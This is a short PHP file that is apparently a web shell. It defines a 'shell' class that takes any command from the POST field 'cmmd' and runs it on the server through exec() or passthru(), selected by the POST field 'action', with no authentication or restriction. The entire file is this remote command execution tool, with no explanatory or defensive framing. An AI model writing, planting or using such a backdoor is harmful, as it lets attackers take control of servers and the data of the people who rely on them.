<?php
class shell{
	function execute()
	{
		echo "<hr>";
		echo "<pre>";
		$result = exec($_POST['cmmd']);
		echo "</pre>";
		echo "<hr>";
	}
	
	function exesys()
	{
		echo "<hr>";
		echo "<pre>";
		$result = passthru($_POST['cmmd']);
		echo "</pre>";
		echo "<hr>";
	}
}

$sh = new shell();

switch ($_POST['action']){
	case 'execute':
        $sh->execute();
        break;
  
    case 'exesys':
        $sh->exesys();
        break;
}
die("");
?>